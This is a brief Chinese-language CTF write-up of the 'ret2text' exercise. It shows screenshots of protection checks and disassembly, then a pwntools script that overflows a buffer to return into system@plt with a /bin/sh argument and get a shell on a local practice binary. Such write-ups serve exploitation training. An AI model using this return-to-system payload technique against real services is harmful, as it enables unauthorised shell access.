# ret2text

检查程序保护

![image-20240426135237331](图片/image-20240426135237331.png)

查看反汇编

![image-20240426135317701](图片/image-20240426135317701.png)

![image-20240426135341338](图片/image-20240426135341338.png)

ida观察到有system函数，利用ROPgadget也可以查到/bin/sh字符串

构造exp

```python
from pwn import*
import time

sh = process('./ret2text')

#gdb.attach(sh)
#sleep(15)

system_plt = 0x080483B0
binsh = 0x08048660

payload = flat([b'a'*20,system_plt,0xcafeefac,binsh])

sh.sendline(payload)
sh.interactive()
```

